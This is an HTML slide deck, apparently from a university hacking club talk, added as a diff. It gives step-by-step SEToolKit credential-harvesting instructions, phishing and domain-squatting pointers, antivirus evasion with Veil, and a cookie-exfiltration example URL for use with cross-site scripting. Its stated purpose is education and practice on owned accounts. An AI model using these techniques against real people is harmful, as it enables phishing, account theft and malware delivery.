@@ -1,0 +1,146 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+
+	<title>TITLE | Cornell Hacking Club</title>
+
+	<link rel="stylesheet" href="css/reveal.css">
+	<link rel="stylesheet" href="css/theme/chc.css" id="theme">
+</head>
+<body>
+	<div class="reveal">
+		<div class="slides">
+
+			<section>
+				<h1>Many Different Things</h1>
+                <h3>And Some Other Stuff</h3>
+			</section>
+
+            <section>
+                <h2>First things first</h2>
+                <p>This is not designed to teach you how to hack, but rather for you to understand
+                how certain attacks work</p>
+                <p>Don't be dumb, only do this with accounts you own</p>
+                <p>Also, don't be a script kiddy; learn this stuff for real, and know much more than
+                what is in these slides</p>
+                <p>This is meant to be a teaser - a jumping off point so that you can learn more
+                on your own</p>
+            </section>
+
+			<section>
+				<h2>Agenda</h2>
+				<ol>
+					<li>SEToolKit for credential Harvesting</li>
+					<li>Getting a domain</li>
+                    <li>A little bit more on phishing</li>
+                    <li>Evading AV</li>
+					<li>Angler</li>
+                    <li>Vulnerable Apps</li>
+				</ol>
+			</section>
+
+			<section>
+				<h2>Credential Harvesting</h2>
+                <p>
+                Use <a href='https://github.com/trustedsec/social-engineer-toolkit'>SEToolKit</a>
+                in order to steal credentials. Its relatively easy to perform a credential harvesting
+                attack.
+                </p>
+			</section>
+
+            <section>
+                <h2>Steps for credential harvesting</h2>
+                <ol>
+                    <li>Run setoolkit (its instaled on kali linux by default), or clone it</li>
+                    <li>Select social engineering attacks</li>
+                    <li>Select website attack vectors</li>
+                    <li>Select credential harvesting</li>
+                </ol>
+            </section>
+
+
+            <section>
+                <h2>Steps for credential harvesting Continued</h2>
+                <ol start=5>
+                    <li>Select web templates</li>
+                    <li>Find your ip address (In a new terminal window, run ifconfig)</li>
+                    <li>Select your desired website, and enter your ip address</li>
+                </ol>
+            </section>
+
+            <section>
+                <h2>Steps for credential harvesting Continued</h2>
+                <ol start=7>
+                    <li>visit your ip address and sign in with fake credentials, they will appear in
+                    the SEToolKit window</li>
+                </ol>
+            </section>
+
+            <section>
+                <h2>Access an internal machine from the internet</h2>
+                <p>Often, you will want to keep kali off the public internet, but still want to
+                access it. You can use <a href='https://ngrok.com'>NGrok</a> to do this.
+                </p>
+                <p>Simply download it, add it to your $PATH, and run `ngrok http 80`</p>
+            </section>
+
+            <section>
+                <h2>A little bit more on phishing</h2>
+                <p>Phishing is much more than just that. If you spearphish, learn a lot of information
+                about your target first, if you are attempting to hit a lot of targets at once, write
+                a believable email, etc.</p>
+            </section>
+
+            <section>
+                <h2>A little bit more on phishing</h2>
+                <p>Look up the following if you want to head on the right track of a phishing campaign</p>
+                <ul>
+                    <li><a href='https://mailinabox.email'>MailinaBox</a></li>
+                    <li><a href='https://getgophish.com'>GoPhish</a></li>
+                    <li>Social Engineering</li>
+                    <li>Domain Squatting</li>
+                </ul>
+            </section>
+
+            <section>
+                <h2>Evading AV</h2>
+                <p>Often, when phishing, a malicious file instead of url will be used, but these are
+                much more likely to be stopped by antivirus. For this, you will want to encode your
+                payload.</p>
+                <p>You can encode your binary with <a href='https://github.com/Veil-Framework/Veil'>Veil.</a></p>
+            </section>
+
+            <section>
+                <h2>Angler</h2>
+                <ul>
+                    <li>Occasionally, when doing things, you will want to exfiltrate some data.</li>
+                    <li>I like to use use url requests for doing this. <a href='https://github.com/mattlombana/angler'>Angler</a></li>
+                    <li>This can be used to steal cookies when combined with Cross-Site Scripting</li>
+                    <li>just send a get request to [anglerurl]/catch/[data] with data</li>
+                    <li>For example: http://127.0.0.1/catch/session=exampleSession</li>
+                </ul>
+            </section>
+
+            <section>
+                <h2>Vulnerable Apps</h2>
+                <p>If you want to practice with this, checkout <a href='https://github.com/MattLombana/Vulnerable-Apps'>Vulnerable Apps.</a> (You can use Angler to steal the admin's cookie in Cross-Country)</p>
+            </section>
+
+            <section>
+                <h2>Once again</h2>
+                <p>This is not designed to teach you how to hack, but rather for you to understand
+                how certain attacks work</p>
+                <p>Don't be dumb, only do this with accounts you own</p>
+                <p>Also, don't be a script kiddy; learn this stuff for real, and know much more than
+                what is in these slides</p>
+                <p>This is meant to be a teaser - a jumping off point so that you can learn more
+                on your own</p>
+            </section>
+
+		</div>
+	</div>
+	<script src="js/reveal.js"></script>
+	<script>Reveal.initialize();</script>
+</body>
+</html>
